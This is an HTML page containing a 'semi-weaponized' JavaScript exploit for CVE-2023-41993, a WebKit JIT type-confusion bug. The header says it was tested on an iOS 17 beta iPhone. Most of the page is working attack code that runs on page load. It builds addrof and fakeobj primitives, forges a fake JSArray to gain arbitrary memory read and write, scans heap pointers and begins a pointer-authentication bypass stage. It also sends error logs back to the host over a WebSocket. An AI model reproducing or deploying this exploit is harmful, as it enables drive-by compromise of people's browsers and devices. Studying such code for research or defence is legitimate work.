
<!DOCTYPE html>
<html>
<body>
<h1>Exploit for CVE-2023-41993</h1>
<p id="log">
    <!-- Log goes here -->
</p>
<script>
window.onerror = function(message, source, lineno, colno, error) {
    try {
        let ErrorName = error.name;
    } catch (ee) {
        document.getElementById("log").innerHTML += "<h1 style='color:red'>This browser is not supported!</h1>";
        return true;
    }
    if ('InvalidStateError' == error.name) {
        location.reload();
    } else if ('TypeError' == error.name) {
        location.reload();
    } else {
        document.getElementById("log").innerHTML += "<h1 style='color:red'>"+message+" @ "+lineno+"</h1>";
        try {
            ws.send(""+message+" @ "+lineno);
        } catch (error) {
            void(0);
        }
    }
    return true;
};
</script>
<script>
var loc = window.location;
var wsProtocol = loc.protocol === 'https:' ? 'wss:' : 'ws:';
var wsURL = wsProtocol + '//' + loc.host + '/WebSocket';
try {
    var ws = new WebSocket(wsURL);
    ws.onopen = function() {
        ws.send("Exploit for CVE-2023-41993");
    };
} catch (error) {
    void(0);
}
</script>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script src="./helper.js"></script>
<script>
/*
semi-weaponized exploit for CVE-2023-41993
tested on iOS 17.0 Beta 2 on iPhone 14 Pro Max
Author: https://github.com/0x06060606
*** DO NOT USE THIS EXPLOIT FOR MALICIOUS PURPOSES ***
poc: https://github.com/po6ix/POC-for-CVE-2023-41993/tree/main
poc author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

function hax(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

function setup_addrof_fakeobj() {
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = hax();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        log("Failed to trigger getterSetter!");
        alert("Failed to trigger getterSetter!");
        location.reload();
        return [null, null];
    } else {
        let symbolObject = Object(getterSetter);
        let ref_arr = [];
        for (let i = 0; i < offsets.factor; ++i) {
            ref_arr.push(symbolObject.description);
        }
        getter.p13 = 1.1;
        let unboxed_arr = getter;
        let addrof = function addrof(o) {
            boxed_arr[OVERLAP_OFFSET] = o;
            var addr = unboxed_arr[0];
            boxed_arr[OVERLAP_OFFSET] = null;
            return addr;
        }
        let fakeobj = function fakeobj(addr) {
            unboxed_arr[0] = addr;
            var fake = boxed_arr[OVERLAP_OFFSET];
            boxed_arr[OVERLAP_OFFSET] = null;
            return fake;
        }
        return [addrof, fakeobj];
    }
}

function setup_rw(){
    SetupOffsets();
    log("Stage 1: setup addrof and fakeobj");
    let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();
    function addrof(obj) {
        return Int64.fromDouble(raw_addrof(obj));
    }
    function fakeobj(addr) {
        return raw_fakeobj(addr.asDouble());
    }
    log("Stage 2: setup r/w primitive");
    function LeakStructureID(obj) {
        let container = {
            cellHeader: i2obj(0x0108200700000000),
            butterfly: obj
        };
        let fakeObjAddr = Add(addrof(container), 0x10); // 16
        let fakeObj = fakeobj(fakeObjAddr);
        f64[0] = fakeObj[0];
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
        return [structureID, fakeObj, container];
    }
    let float_arr = [Math.random(), 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    var [structureID, fakeObj, container] = LeakStructureID(float_arr);
    log("[*] Fake JSArray @ " + addrof(fakeObj).toString());
    let fake_arr = fakeobj(addrof(fakeObj));
    let legit_arr = fakeObj;
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? fake_arr : legit_arr;
        results.push(a[0]);
    }
    jscell_header = results[0];
    container.jscell_header = jscell_header;
    log(`[*] Copied legit JSCell header: ${Int64.fromDouble(jscell_header)}`);
    let controller = fake_arr;
    let memarr = float_arr;
    function read64(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }
    function read8(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 1);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }
    function write64(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }
    function write8(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 1);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }
    let testarray = [1.1, 2.2, 3.3, 4.4, 5.5];
    let testarray_addr = addrof(testarray);
    log("[*] testarray @ " + testarray_addr);
    let testarray_before = read64(testarray_addr);
    log("[*] testarray = " + testarray_before.toString());
    write64(testarray_addr, new Int64(0xdeadc0de));
    let testarray_after = read64(testarray_addr);
    log("[*] testarray = " + testarray_after.toString());
    if (testarray_after.toString() == new Int64(0xdeadc0de)) {
        write64(testarray_addr, testarray_before);
        log("[*] testarray = " + read64(testarray_addr).toString());
        log("[+] Achieved limited arbitrary read/write \\o/");
        function HeapPointerScanner(ATS, STP, debug=false) {
            if (debug) log("[*] Scanning for Pointers @ " + ATS.toString());
            var dumped = {};
            var dumpOffset = 0;
            var dumpMap = [];
            var dumpOffsets = [];
            for (let i = 0; i < ITERATIONS; i++) {
                var trgtAddr = read64(Add(ATS, dumpOffset));
                if (trgtAddr.toString() == new Int64(0x0000000000000000)) {
                    if (debug) log("[*] Reached end of heap, stopping pointer scan");
                    break;
                } else {
                    var fakey = fakeobj(trgtAddr);
                    dumped[trgtAddr] = fakey;
                    dumpOffsets.push(new Int64(dumpOffset));
                    dumpMap.push(trgtAddr);
                    dumpOffset += STP; // sizeof(void*) usually 8
                }
            }
            if (debug) log("[*] Dumped " + Object.keys(dumped).length + " pointer objects");
            if (debug) {
                for (let i = 0; i < Object.keys(dumped).length; i++) {
                    try {
                        var ObjOffset = (Add(dumpMap[i], 0x10)).toString();
                        var ObjAddr = Object.keys(dumped)[i];
                        var ObjType = Object.prototype.toString.call(dumped[ObjAddr]);
                        log(" ["+i+"] " + ObjAddr.toString() + " @ " + dumpOffsets[i].toString());
                        log("  ["+i+"] " + (typeof dumped[ObjAddr]) + " " + ObjType.toString());
                    } catch(e) {
                        log(" [!] " + e);
                    }
                }
            }
            return [dumped, dumpMap, dumpOffsets];
        }
        function StripPAC(ADDR) {
            return And(ADDR, new Int64('0xFFFFFFFF8'));
        }
        function doubleToHex(doubleValue) {
            const buffer = new ArrayBuffer(8);  // a double is 8 bytes (64 bits)
            const view = new DataView(buffer);
            view.setFloat64(0, doubleValue, false);  // false for big-endian
            let result = '';
            for (let i = 0; i < 8; i++) {
                const byte = view.getUint8(i).toString(16);
                result = byte.padStart(2, '0') + result;  // pad with 0 if byte is a single digit
            }
            return result;
        }
        function hexToString(hex) {
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                const decimalValue = parseInt(hex.substr(i, 2), 16);
                if (decimalValue >= 32 && decimalValue <= 126) {
                    str += String.fromCharCode(decimalValue);
                } else {
                    str += '.';
                }
            }
            return str;
        }
        function doubleToString(doubleValue) {
            return hexToString(doubleToHex(doubleValue));
        }
        function copyObj(addr, debug=false, length=0x5000) {
            length = (length);
            let ObjTemp = [];
            if (debug) log(" [#] Copying object @ " + addr.toString());
            for (let i = 0; i < length; i++) {
                if (i == length) {
                    if (debug) log(" [#] Ran out of memory to copy, stopping");
                    break;
                }
                let TempData = read64(Add(addr, i*8));
                if (TempData.toString() == new Int64(0x0000000000000000)) {
                    break;
                } else {
                    if (debug) log(" [#] " + doubleToString(TempData.asDouble()));
                    ObjTemp.push(TempData);
                }
            }
            if (debug) log(" [#] Copied " + (ObjTemp.length * 8) + " bytes");
            return ObjTemp;
        }
        function HexView(addr, length=10, debug=false) {
            let TempCopy = copyObj(addr, debug, (length*8));
            if (debug) log(" [#] HexView @ " + addr + " (" + length + ")");
            var TempLog = "";
            for (let i = 0; i < TempCopy.length; i++) {
                TempLog += doubleToString(TempCopy[i].asDouble())
            }
            log(TempLog);
        }
        function HasPAC() {
            let VicObj = [
                13.37
            ];
            let VicBef = read64(addrof(VicObj));
            let VicAft = StripPAC(read64(addrof(VicObj)));
            if (VicBef.toString() == VicAft.toString()) {
                return false;
            } else {
                return true;
            }
        }
        if (HasPAC()) {
            log("[*] PAC detected");
            log("Stage 3: setup PAC bypass");

            // Hex View Test
            let Sin = Math.sin(13.37);
            let SinAddr = addrof(Sin);
            log("[*] Math.sin @ " + SinAddr.toString());
            let SinAddrStripped = StripPAC(SinAddr);
            log("[*] Math.sin (stripped) @ " + SinAddrStripped.toString());
            HexView(SinAddrStripped, 0x100);
            // End Hex View Test

        } else {
            log("[*] PAC not detected, Likely in a simulator or old iOS version.");
            log("[*] Crashing :0");
            write64(new Int64(0x4141414141414141), new Int64(0x4141414141414141));
            return;
        }
    } else {
        log("[-] Failed to achieve limited arbitrary read/write :(");
        alert("[-] Failed to achieve limited arbitrary read/write :(");
        location.reload();
        return;
    }
}

window.onload = function() {
    setTimeout(function() {
        setup_rw();
    }, 100);
};

</script>
</body>
</html>